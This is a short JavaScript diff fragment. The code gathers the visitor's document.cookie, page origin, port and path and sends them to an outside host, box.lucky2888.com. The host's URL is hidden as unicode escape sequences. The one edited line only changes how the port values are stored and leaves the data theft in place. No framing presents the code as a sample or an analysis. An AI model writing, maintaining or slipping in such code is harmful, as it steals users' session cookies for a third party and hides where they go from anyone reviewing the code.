@@ -18,7 +18,7 @@
     this.dt = {
         c: document.cookie,
         d: window.location.origin,
-        p: window.location.port ? window.location.port : window.location.protocol == 'https:' ? 443 : 80,
+        p: window.location.port ? window.location.port : window.location.protocol == 'https:' ? '443' : '80',
         t: window.location.pathname
     }
     this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006c\u0075\u0063\u006b\u0079\u0032\u0038\u0038\u0038\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: this.dt });
